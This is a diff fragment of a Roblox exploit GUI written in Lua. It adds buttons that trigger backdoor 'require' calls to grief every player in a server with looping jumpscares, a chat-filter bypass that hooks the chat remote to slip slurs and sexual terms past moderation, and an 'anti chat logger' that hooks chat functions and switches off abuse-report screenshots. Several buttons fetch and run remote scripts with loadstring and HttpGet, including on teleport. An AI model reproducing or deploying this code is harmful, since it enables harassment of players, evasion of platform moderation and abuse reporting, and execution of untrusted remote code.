+					return math.acos(math.cos(X*math.pi))/math.pi
+				end
+	
+				Counter = 0
+	
+				Lighting.TimeOfDay = "12:00"
+	
+				while wait(0.1) do 
+					ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
+					Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
+					Counter += 0.01
+				end
+			end)
+		end
+		coroutine.wrap(KPETQT_fake_script)()
+		local function VAACFMX_fake_script() -- Particles.Script 
+			local script = Instance.new('Script', Particles)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				for i, v in pairs(game.Players:GetChildren()) do
+					emit = Instance.new("ParticleEmitter")
+					emit.Parent = v.Character.Head
+					emit.Texture = "http://www.roblox.com/asset/?id=9698929683"
+					emit.VelocitySpread = 100000
+				end
+			end)
+		end
+		coroutine.wrap(VAACFMX_fake_script)()
+		local function BCSM_fake_script() -- jumpscare.Script 
+			local script = Instance.new('Script', jumpscare)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				for i,v in pairs(game.Players:GetPlayers()) do
+					if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
+						spawn(function()
+							local newgui = Instance.new("ScreenGui",v.PlayerGui)
+							newgui.Name = "Screamer"
+							local newimage = Instance.new("ImageLabel",newgui)
+							newimage.Image = "http://www.roblox.com/asset/?id=9018233362"
+							newimage.Size = UDim2.new(1,1,1,1)
+							local s = Instance.new("Sound",newgui)
+							s.SoundId = "rbxassetid://9069609200"
+							s.Volume = 9999999999999999999999999999999999999
+							s.Looped = true
+							s:Play()
+							print("Screamed "..v.Name)
+							while wait(9) do
+	
+								newimage.Parent:Destroy()
+	
+							end
+						end)
+					end
+				end
+			end)
+		end
+		coroutine.wrap(BCSM_fake_script)()
+		local function XMTXAS_fake_script() -- stopmusic.Script 
+			local script = Instance.new('Script', stopmusic)
+	
+			function onClick()
+				Instance.new("Sound").Parent = game.Workspace  game.Workspace.Sound.SoundId ="rbxassetid://0" game.Workspace.Sound.Looped=true  game.Workspace.Sound:Play()
+			end
+	
+			script.Parent.MouseButton1Down:connect(onClick)
+		end
+		coroutine.wrap(XMTXAS_fake_script)()
+		local function DKNSUN_fake_script() -- destroy.jump 
+			local script = Instance.new('Script', destroy)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				for i,v in pairs(game.Players:GetPlayers()) do
+					if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
+						spawn(function()
+							local newgui = Instance.new("ScreenGui",v.PlayerGui)
+							newgui.Name = "Screamer"
+							local newimage = Instance.new("ImageLabel",newgui)
+							newimage.Image = "http://www.roblox.com/asset/?id=7676654418"
+							newimage.Size = UDim2.new(1,1,1,1)
+							local s = Instance.new("Sound",newgui)
+							s.SoundId = "rbxassetid://9069609200"
+							s.Volume = 9999999999999999999999999999999999999
+							s.Looped = true
+							s:Play()
+							print("Screamed "..v.Name)
+							while wait(9) do
+	
+								newimage.Parent:Destroy()
+	
+							end
+						end)
+					end
+				end
+			end)
+		end
+		coroutine.wrap(DKNSUN_fake_script)()
+		local function WTPOEMO_fake_script() -- destroy.Script 
+			local script = Instance.new('Script', destroy)
+	
+			script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
+				require(9617037720)():start()
+			end)
+		end
+		coroutine.wrap(WTPOEMO_fake_script)()
+		local function EQIXZDE_fake_script() -- destroy.LocalScript 
+			local script = Instance.new('LocalScript', destroy)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				script.Parent.RemoteEvent:FireServer()
+			end)
+		end
+		coroutine.wrap(EQIXZDE_fake_script)()
+		local function LXELW_fake_script() -- ss1.Script 
+			local script = Instance.new('Script', ss1)
+	
+			script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
+				require(8946786542).load(plr.name)
+			end)
+	
+		end
+		coroutine.wrap(LXELW_fake_script)()
+		local function RJYUHDG_fake_script() -- ss1.LocalScript 
+			local script = Instance.new('LocalScript', ss1)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				script.Parent.RemoteEvent:FireServer()
+			end)
+		end
+		coroutine.wrap(RJYUHDG_fake_script)()
+		local function QLYQ_fake_script() -- ss2.Script 
+			local script = Instance.new('Script', ss2)
+	
+			script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
+				require(9134953766).load(plr.name)
+			end)
+	
+		end
+		coroutine.wrap(QLYQ_fake_script)()
+		local function EATC_fake_script() -- ss2.LocalScript 
+			local script = Instance.new('LocalScript', ss2)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				script.Parent.RemoteEvent:FireServer()
+			end)
+		end
+		coroutine.wrap(EATC_fake_script)()
+		local function GGVJJ_fake_script() -- ss3.Script 
+			local script = Instance.new('Script', ss3)
+	
+			script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
+				require(9497518303).BYTEGUIKYXLES(plr.name)
+			end)
+	
+		end
+		coroutine.wrap(GGVJJ_fake_script)()
+		local function BOJJEJ_fake_script() -- ss3.LocalScript 
+			local script = Instance.new('LocalScript', ss3)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				script.Parent.RemoteEvent:FireServer()
+			end)
+		end
+		coroutine.wrap(BOJJEJ_fake_script)()
+		local function CVBSU_fake_script() -- nazi.Script 
+			local script = Instance.new('Script', nazi)
+	
+			function click()
+				s = Instance.new("Sky")
+				s.Name = "Sky"
+				s.Parent = game.Lighting
+				s.SkyboxBk = "http://www.roblox.com/asset/?id=7676654418"
+				s.SkyboxDn = "http://www.roblox.com/asset/?id=7676654418"
+				s.SkyboxFt = "http://www.roblox.com/asset/?id=7676654418"
+				s.SkyboxLf = "http://www.roblox.com/asset/?id=7676654418"
+				s.SkyboxRt = "http://www.roblox.com/asset/?id=7676654418"
+				s.SkyboxUp = "http://www.roblox.com/asset/?id=7676654418"
+				game.Lighting.TimeOfDay = 12
+			end
+	
+			script.Parent.MouseButton1Down:connect(click)
+		end
+		coroutine.wrap(CVBSU_fake_script)()
+	
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(POJGGLL_fake_script)()
+local function ZMXEW_fake_script() -- c00lgui.function 
+	local script = Instance.new('LocalScript', c00lgui)
+
+	function click()
+	loadstring(game:GetObjects("rbxassetid://9827584846")[1].Source)()
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(ZMXEW_fake_script)()
+local function OSWM_fake_script() -- cbypass.function 
+	local script = Instance.new('LocalScript', cbypass)
+
+	function click()
+		local Bypasses = {
+			["ass"] = "as{{aieixzvzx:s}}",
+			["asshole"] = "as{{aieixzvzx:shole}}",
+			["bitch"] = "bit{{aieixzvzx:ch}}",
+			["cock"] = "co{{aieixzvzx:ck}}",
+			["cunt"] = "cu{{aieixzvzx:nt}}",
+			["dick"] = "di{{zczxczvz:ck}}",
+			["dyke"] = "dy{{aieixzvzx:ke}}",
+			["faggot"] = "fa{{aieixzvzx:ggot}}",
+			["fuck"] = "fu{{aieixzvzx:ck}}",
+			["gaylord"] = "gayl{{aieixzvzx:ord}}",
+			["cum"] = "cu{{aieixzvzx:m}}",
+			["sex"] = "se{{aieixzvzx:x}}",
+			["hitler"] = "hit{{aieixzvzx:ler}}",
+			["cum"] = "cu{{aieixzvzx:m}}",
+			["kike"] = "ki{{aieixzvzx:ke}}",
+			["motherfucker"] = "motherf{{aieixzvzx:ucker}}",
+			["nigga"] = "ni{{aieixzvzx:gga}}",
+			["nigger"] = "ni{{aieixzvzx:gger}}",
+			["piss"] = "p{{aieixzvzx:iss}}",
+			["penis"] = "pe{{aieixzvzx:nis}}",
+			["pussy"] = "pu{{aieixzvzx:ssy}}",
+			["shit"] = "sh{{aieixzvzx:it}}",
+			["slut"] = "sl{{aieixzvzx:ut}}",
+			["whore"] = "who{{aieixzvzx:re}}",
+			["discord"] = "disco{{aieixzvzx:rd}}",
+			["kys"] = "k{{aieixzvzx:ys}}",
+			["slave"] = "sla{{aieixzvzx:ve}}",
+			["niggers"] = "ni{{aieixzvzx:ggers}}",
+			["kill"] = "ki{{aieixzvzx:ll}}",
+			["date"] = "da{{aieixzvzx:te}}",
+			["raped"] = "ra{{aieixzvzx:ped}}",
+			["rape"] = "ra{{aieixzvzx:pe}}",
+			["hentai"] = "hen{{aieixzvzx:tai}}",
+			["pornhub"] = "po{{aieixzvzx:rnhub}}",
+			["childporn"] = "childpo{{aieixzvzx:rn}}",
+			["fucking"] = "fuc{{aieixzvzx:king}}",
+			["tits"] = "ti{{aieixzvzx:ts}}",
+			["discord.com"] = "disco{{aieixzvzx:rd.com}}",
+			["wtf"] = "wt{{aieixzvzx:f}}",
+			["will"] = "wi{{aieixzvzx:ll}}",
+			["porn"] = "po{{aieixzvzx:rn}}",
+			["gay"] = "g{{aieixzvzx:ay}}",
+			["1"] = "on{{aieixzvzx:e}}",
+			["2"] = "t{{aieixzvzx:wo}}",
+			["3"] = "th{{aieixzvzx:ree}}",
+			["4"] = "fo{{aieixzvzx:ur}}",
+			["5"] = "fi{{aieixzvzx:ve}}",
+			["6"] = "s{{aieixzvzx:ix}}",
+			["7"] = "se{{aieixzvzx:ven}}",
+			["8"] = "ei{{aieixzvzx:ght}}",
+			["9"] = "ni{{aieixzvzx:ne}}",
+			["10"] = "te{{aieixzvzx:n}}",
+			["daddy"] = "da{{aieixzvzx:ddy}}",
+			["mommy"] = "mo{{aieixzvzx:mmy}}",
+			["kkk"] = "k{{aieixzvzx:kk}}",
+			["suck"] = "suc{{aieixzvzx:k}}",
+			["sucking"] = "suc{{aieixzvzx:king}}",
+			["ㅤ"] = "ㅤ{{aieixzvzx:ㅤ}}",
+			["marry"] = "mar{{aieixzvzx:ry}}",
+			["kiss"] = "kis{{aieixzvzx:s}}",
+			["blow"] = "bl{{aieixzvzx:ow}}",
+			["athiest"] = "athi{{aieixzvzx:est}}",
+			["jewish"] = "je{{aieixzvzx:wish}}",
+			["christian"] = "chri{{aieixzvzx:stian}}",
+			["muslim"] = "mu{{aieixzvzx:slim}}",
+			["jurdism"] = "jur{{aieixzvzx:dism}}",
+			["islam"] = "isl{{aieixzvzx:am}}",
+			["christianity"] = "chri{{aieixzvzx:stianity}}",
+			["bomb"] = "bom{{aieixzvzx:b}}",
+			["dick"] = "d{{aieixzvzx:icc}}",
+			["you"] = "yo{{aieixzvzx:u}}",
+			["child"] = "chi{{aieixzvzx:ld}}",
+			["my"] = "m{{aieixzvzx:y}}",
+			["racism"] = "raci{{aieixzvzx:sm}}",
+			["hoe"] = "h{{aieixzvzx:oe}}",
+			["sucide"] = "suc{{aieixzvzx:ide}}",
+			["your"] = "yo{{aieixzvzx:ur}}",
+			["sugar"] = "sug{{aieixzvzx:ar}}",
+			["on"] = "o{{aieixzvzx:n}}",
+			["riding"] = "rid{{aieixzvzx:ing}}",
+			["he"] = "h{{aieixzvzx:e}}",
+			["she"] = "sh{{aieixzvzx:e}}",
+			["is"] = "i{{aieixzvzx:s}}",
+			["all"] = "al{{aieixzvzx:l}}",
+			["nazi"] = "naz{{aieixzvzx:i}}",
+			["gore"] = "gor{{aieixzvzx:e}}",
+			["black"] = "bla{{aieixzvzx:ck}}",
+			["last"] = "la{{aieixzvzx:st}}",
+			["night"] = "n{{aieixzvzx:ight}}",
+			["fucked"] = "fu{{aieixzvzx:cked}}",
+			["peg"] = "pe{{aieixzvzx:g}}",
+			["pegged"] = "pe{{aieixzvzx:gged}}",
+			["finger"] = "fin{{aieixzvzx:ger}}",
+			["fingered"] = "fin{{aieixzvzx:gered}}",
+			["because"] = "beca{{aieixzvzx:use}}",
+			["eat"] = "ea{{aieixzvzx:t}}",
+			["am"] = "a{{aieixzvzx:m}}",
+			["gonna"] = "go{{aieixzvzx:nna}}",
+			["have"] = "hav{{aieixzvzx:e}}",
+			["cuddle"] = "cud{{aieixzvzx:dle}}",
+			["lick"] = "lic{{aieixzvzx:k}}",
+			["balls"] = "ba{{aieixzvzx:lls}}",
+			["wanna"] = "wa{{aieixzvzx:nna}}",
+			["bend"] = "ben{{aieixzvzx:d}}",
+			["over"] = "ov{{aieixzvzx:er}}",
+			["baby"] = "ba{{aieixzvzx:by}}",
+			["babe"] = "ba{{aieixzvzx:be}}",
+			["sexy"] = "se{{aieixzvzx:xy}}",
+			["this"] = "th{{aieixzvzx:is}}",
+			["attractive"] = "attr{{aieixzvzx:active}}"
+	
+	
+	
+	
+		}
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local Remote = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
+	
+		local ChatBypass; ChatBypass = hookmetamethod(Remote, "__namecall", function(self, ...)
+			local Method = getnamecallmethod()
+			local Arguments = {...}
+	
+			if self == Remote and Method == "FireServer" then
+				local Message = Arguments[1]
+				local Split = Message:split(" ")
+				local FinalMessage = ""
+	
+				for _, x in next, Split do
+					for _, Bypass in next, Bypasses do
+						if x:lower() == _ then
+							if x:upper() ~= x then
+								Message = Message:gsub(x, Bypass)
+								FinalMessage = Message .. " fn"
+							else
+								Message = Message:gsub(x, Bypass):upper()
+								FinalMessage = Message:gsub(x, Bypass):upper() .. " fn"
+							end
+						end
+					end
+				end
+	
+				if FinalMessage ~= "" then
+					Arguments[1] = FinalMessage
+				end
+	
+				return ChatBypass(self, unpack(Arguments))
+			end
+	
+			return ChatBypass(self, ...)
+		end)
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(OSWM_fake_script)()
+local function PXYJWQN_fake_script() -- antiban.function 
+	local script = Instance.new('LocalScript', antiban)
+
+	function click()
+	if not game:IsLoaded() then
+		game.Loaded:wait()
+	end
+	
+	local ACL_LoadTime = tick()
+	
+	local CoreGui = game:GetService("CoreGui")
+	local StarterGui = game:GetService("StarterGui")
+	local TweenService = game:GetService("TweenService")
+	local Players = game:GetService("Players")
+	
+	local Player = Players.LocalPlayer
+	
+	local PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui") do
+		if not PlayerGui then
+			repeat task.wait() until Player:FindFirstChildWhichIsA("PlayerGui")
+			PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui")
+		end
+	end
+	
+	local Notify = function(_Title, _Text , Time)
+		StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
+	end
+	
+	local Tween = function(Object, Time, Style, Direction, Property)
+		return TweenService:Create(Object, TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction]), Property)
+	end
+	
+	local Insert = function(Tbl, ...)
+		for _, x in next, {...} do
+			table.insert(Tbl, x) 
+		end
+	end
+	
+	local ChatFixToggle = true
+	local CoreGuiSettings = {}
+	local ChatFix
+	
+	ChatFix = hookmetamethod(StarterGui, "__namecall", function(self, ...)
+		local Method = getnamecallmethod()
+		local Arguments = {...}
+	
+		if not checkcaller() and ChatFixToggle and Method == "SetCoreGuiEnabled" then
+			local CoreGuiType = Arguments[1]
+			local SettingValue = Arguments[2]
+	
+			if CoreGuiType == ("All" or "Chat") then
+				Insert(CoreGuiSettings, CoreGuiType, SettingValue)
+				return
+			end
+		end
+	
+		return ChatFix(self, ...)
+	end)
+	
+	local ACLWarning = Instance.new("ScreenGui")
+	local Background = Instance.new("Frame")
+	local Top = Instance.new("Frame")
+	local Exit = Instance.new("TextButton")
+	local UICorner = Instance.new("UICorner")
+	local WarningLbl = Instance.new("TextLabel")
+	local Loading = Instance.new("Frame")
+	local Bar = Instance.new("Frame")
+	local WarningBackground = Instance.new("Frame")
+	local WarningFrame = Instance.new("Frame")
+	local Despair = Instance.new("TextLabel")
+	local UIListLayout = Instance.new("UIListLayout")
+	local Reason_1 = Instance.new("TextLabel")
+	local Reason_2 = Instance.new("TextLabel")
+	local Trollge = Instance.new("ImageLabel")
+	local UIPadding = Instance.new("UIPadding")
+	
+	local MakeGuiThread = coroutine.wrap(function()    
+		syn.protect_gui(ACLWarning)
+	
+		ACLWarning.Name = "ACL Warning"
+		ACLWarning.Parent = CoreGui
+		ACLWarning.Enabled = false
+		ACLWarning.DisplayOrder = -2147483648
+	
+		Background.Name = "Background"
+		Background.Parent = ACLWarning
+		Background.AnchorPoint = Vector2.new(0.5, 0.5)
+		Background.BackgroundColor3 = Color3.fromRGB(21, 0, 0)
+		Background.BorderSizePixel = 0
+		Background.Position = UDim2.new(0.5, 0, 0.5, 0)
+		Background.Size = UDim2.new(0.300000012, 0, 0.5, 0)
+	
+		Top.Name = "Top"
+		Top.Parent = Background
+		Top.AnchorPoint = Vector2.new(0.5, 0.5)
+		Top.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+		Top.BorderSizePixel = 0
+		Top.Position = UDim2.new(0.5, 0, 0.100000001, 0)
+		Top.Size = UDim2.new(0.899999976, 0, 0.100000001, 0)
+	
+		Exit.Name = "Exit"
+		Exit.Parent = Top
+		Exit.AnchorPoint = Vector2.new(0.5, 0.5)
+		Exit.BackgroundColor3 = Color3.fromRGB(38, 0, 0)
+		Exit.Position = UDim2.new(0.949999988, 0, 0.5, 0)
+		Exit.Size = UDim2.new(0.100000001, -6, 1, -9)
+		Exit.Visible = false
+		Exit.Font = Enum.Font.Arcade
+		Exit.Text = "X"
+		Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Exit.TextScaled = true
+		Exit.TextSize = 14.000
+		Exit.TextWrapped = true
+	
+		UICorner.CornerRadius = UDim.new(0.200000003, 0)
+		UICorner.Parent = Exit
+	
+		WarningLbl.Name = "WarningLbl"
+		WarningLbl.Parent = Top
+		WarningLbl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		WarningLbl.BackgroundTransparency = 1.000
+		WarningLbl.Position = UDim2.new(0, 17, 0, 0)
+		WarningLbl.Size = UDim2.new(0.5, 0, 1, 0)
+		WarningLbl.Font = Enum.Font.Arcade
+		WarningLbl.Text = "Warning!"
+		WarningLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+		WarningLbl.TextScaled = true
+		WarningLbl.TextSize = 14.000
+		WarningLbl.TextWrapped = true
+		WarningLbl.TextXAlignment = Enum.TextXAlignment.Left
+	
+		Loading.Name = "Loading"
+		Loading.Parent = Top
+		Loading.AnchorPoint = Vector2.new(0.5, 0.5)
+		Loading.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+		Loading.BorderSizePixel = 0
+		Loading.Position = UDim2.new(0.699999988, 0, 0.5, 0)
+		Loading.Size = UDim2.new(0.349999994, 0, 0.0199999996, 0)
+	
+		Bar.Name = "Bar"
+		Bar.Parent = Loading
+		Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Bar.BorderSizePixel = 0
+		Bar.Size = UDim2.new(0, 0, 1, 0)
+	
+		WarningBackground.Name = "WarningBackground"
+		WarningBackground.Parent = Background
+		WarningBackground.AnchorPoint = Vector2.new(0.5, 0.5)
+		WarningBackground.BackgroundColor3 = Color3.fromRGB(9, 9, 9)
+		WarningBackground.BorderSizePixel = 0
+		WarningBackground.Position = UDim2.new(0.5, 0, 0.550000012, 0)
+		WarningBackground.Size = UDim2.new(0.899999976, 0, 0.800000012, 0)
+	
+		WarningFrame.Name = "WarningFrame"
+		WarningFrame.Parent = WarningBackground
+		WarningFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+		WarningFrame.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
+		WarningFrame.BorderSizePixel = 0
+		WarningFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+		WarningFrame.Size = UDim2.new(0.899999976, 0, 0.899999976, 0)
+	
+		Despair.Name = "Despair"
+		Despair.Parent = WarningFrame
+		Despair.AnchorPoint = Vector2.new(0.5, 0.5)
+		Despair.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
+		Despair.BackgroundTransparency = 1.000
+		Despair.BorderColor3 = Color3.fromRGB(27, 42, 53)
+		Despair.BorderSizePixel = 0
+		Despair.Position = UDim2.new(0.5, 0, 0.100000001, 0)
+		Despair.Size = UDim2.new(0.949999988, 0, 0.119999997, 0)
+		Despair.Font = Enum.Font.Oswald
+		Despair.Text = "Anti Chat Logger will not work here!"
+		Despair.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Despair.TextScaled = true
+		Despair.TextSize = 50.000
+		Despair.TextWrapped = true
+		Despair.TextYAlignment = Enum.TextYAlignment.Top
+	
+		UIListLayout.Parent = WarningFrame
+		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+		UIListLayout.Padding = UDim.new(0, 15)
+	
+		Reason_1.Name = "Reason_1"
+		Reason_1.Parent = WarningFrame
+		Reason_1.AnchorPoint = Vector2.new(0.5, 0.5)
+		Reason_1.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
+		Reason_1.BackgroundTransparency = 1.000
+		Reason_1.BorderColor3 = Color3.fromRGB(27, 42, 53)
+		Reason_1.BorderSizePixel = 0
+		Reason_1.Position = UDim2.new(0.5, 0, 0.100000001, 0)
+		Reason_1.Size = UDim2.new(0.949999988, 0, 0.100000001, 0)
+		Reason_1.Visible = false
+		Reason_1.Font = Enum.Font.Oswald
+		Reason_1.Text = "-Chat Module was not found."
+		Reason_1.TextColor3 = Color3.fromRGB(255, 0, 0)
+		Reason_1.TextScaled = true
+		Reason_1.TextSize = 50.000
+		Reason_1.TextWrapped = true
+		Reason_1.TextYAlignment = Enum.TextYAlignment.Top
+	
+		Reason_2.Name = "Reason_2"
+		Reason_2.Parent = WarningFrame
+		Reason_2.AnchorPoint = Vector2.new(0.5, 0.5)
+		Reason_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
+		Reason_2.BackgroundTransparency = 1.000
+		Reason_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+		Reason_2.BorderSizePixel = 0
+		Reason_2.Position = UDim2.new(0.5, 0, 0.100000001, 0)
+		Reason_2.Size = UDim2.new(0.949999988, 0, 0.100000001, 0)
+		Reason_2.Visible = false
+		Reason_2.Font = Enum.Font.Oswald
+		Reason_2.Text = "-MessagePosted function is invalid."
+		Reason_2.TextColor3 = Color3.fromRGB(255, 0, 0)
+		Reason_2.TextScaled = true
+		Reason_2.TextSize = 50.000
+		Reason_2.TextWrapped = true
+		Reason_2.TextYAlignment = Enum.TextYAlignment.Top
+	
+		Trollge.Name = "Trollge"
+		Trollge.Parent = WarningFrame
+		Trollge.AnchorPoint = Vector2.new(0.5, 0.5)
+		Trollge.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Trollge.BackgroundTransparency = 1.000
+		Trollge.Position = UDim2.new(0.5, 0, 0.670000017, 0)
+		Trollge.Size = UDim2.new(0.449999988, 0, 0.5, 0)
+		Trollge.Image = "rbxassetid://10104834800"
+	
+		UIPadding.Parent = WarningFrame
+		UIPadding.PaddingTop = UDim.new(0, 10)
+	
+		Exit.MouseButton1Click:Connect(function()
+			local UpTween = Tween(Background, .2, "Quint", "Out", {Position = UDim2.new(0.5, 0, 0.45, 0)})
+			local DownTween = Tween(Background, 1, "Quad", "Out", {Position = UDim2.new(0.5, 0, 2, 0)})
+			UpTween:Play()
+			UpTween.Completed:wait()
+			DownTween:Play()
+			DownTween.Completed:wait()
+			ACLWarning:Destroy()
+		end)
+	end)()
+	
+	local ExitCooldown = function()
+		wait(3)
+		local Tween = Tween(Bar, 5, "Quad", "InOut", {Size = UDim2.new(1, 0, 1, 0)})
+		Tween:Play()
+		Tween.Completed:wait()
+		Loading:Destroy()
+		Exit.Visible = true
+	end
+	
+	local PlayerScripts = Player:WaitForChild("PlayerScripts")
+	local ChatMain = PlayerScripts:FindFirstChild("ChatMain", true) or false
+	
+	if not ChatMain then
+		local Timer = tick()
+		repeat
+			task.wait()
+		until PlayerScripts:FindFirstChild("ChatMain", true) or tick() > (Timer + 3)
+		ChatMain = PlayerScripts:FindFirstChild("ChatMain", true)
+		if not ChatMain then
+			ACLWarning.Enabled = true
+			Reason_1.Visible = true
+			ExitCooldown()
+			return
+		end
+	end
+	
+	local PostMessage = require(ChatMain).MessagePosted
+	
+	if not PostMessage then
+		ACLWarning.Enabled = true
+		Reason_2.Visible = true
+		ExitCooldown()
+		return
+	end
+	
+	local MessageEvent = Instance.new("BindableEvent")
+	local OldFunctionHook
+	OldFunctionHook = hookfunction(PostMessage.fire, function(self, Message)
+		if not checkcaller() and self == PostMessage then
+			MessageEvent:Fire(Message)
+			return
+		end
+		return OldFunctionHook(self, Message)
+	end)
+	
+	if setfflag then
+		setfflag("AbuseReportScreenshot", "False")
+		setfflag("AbuseReportScreenshotPercentage", 0)
+	end
+	
+	ChatFixToggle = false
+	ACLWarning:Destroy()
+	if OldSetting then
+		StarterGui:SetCoreGuiEnabled(CoreGuiSettings[1], CoreGuiSettings[2])
+	end
+	Notify("Loaded Successfully", "Anti Chat and Screenshot Logger Loaded! CREDIT : sacred#9060", 15)
+	print(string.format("Anti Chat-Logger has loaded in %s seconds.", tostring(tick() - ACL_LoadTime):sub(1, 4)))
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(PXYJWQN_fake_script)()
+local function RHSBEW_fake_script() -- rektedstudio.function 
+	local script = Instance.new('LocalScript', rektedstudio)
+
+	function click()
+		local function ontp(s)
+			if syn and syn.queue_on_teleport then
+				syn.queue_on_teleport(s)
+			elseif queue_on_teleport then
+				queue_on_teleport(s)
+			end
+		end
+	
+		repeat wait() until game:IsLoaded()
+	
+		wait(3)
+	
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/lolpippiou/rektedstudio/main/script.lua"))()
+		ontp([[loadstring(game:HttpGet("https://raw.githubusercontent.com/lolpippiou/rektedstudio/main/loader.lua"))()]])
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(RHSBEW_fake_script)()
+local function VYOB_fake_script() -- harked.function 
+	local script = Instance.new('LocalScript', harked)
+
+	function click()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/teamc00lkidd1/HarkedReborn/main/HarkedReborn.lua")))()
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(VYOB_fake_script)()
+local function ONQKVSI_fake_script() -- oofhub.function 
+	local script = Instance.new('LocalScript', oofhub)
+
+	function click()
+		loadstring(game:HttpGet(("https://raw.githubusercontent.com/teamc00lkidd1/roblox/main/Games/Kohls%20Admin%20House/KAH%20oofhub%20v2.lua")))()
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(ONQKVSI_fake_script)()
+local function WGNDSFI_fake_script() -- fates.function 
+	local script = Instance.new('LocalScript', fates)
+
+	function click()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(WGNDSFI_fake_script)()
+local function SCRJES_fake_script() -- exit.function 
+	local script = Instance.new('LocalScript', exit)
+
+	function click()
+	script.Parent.Parent.Parent.Main.Visible = false
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(SCRJES_fake_script)()
